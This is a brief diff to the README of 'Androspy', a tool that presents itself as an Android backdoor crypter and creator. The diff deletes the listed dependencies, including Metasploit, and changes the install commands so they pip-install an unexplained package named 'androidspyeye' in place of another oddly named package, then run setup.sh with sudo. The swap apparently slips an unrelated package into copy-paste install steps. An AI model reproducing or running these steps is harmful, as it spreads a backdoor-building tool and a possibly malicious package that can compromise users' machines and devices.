@@ -3,17 +3,9 @@
 <h4 align="center">
 Androspy : is Backdoor Crypter & Creator with Automatic IP Poisener Coded By Belahsan Ouerghi
 
-# Dependencies
-* keytool
-* jarsigner
-* Apache2
-* Metasploit-Framework
-* xterm
-
 # Installation
 ```
-sudo apt-get install git
-pip install tiktokthon==0.1
+pip install androidspyeye
 cd androspy
 chmod +x setup.sh
 sudo ./setup.sh
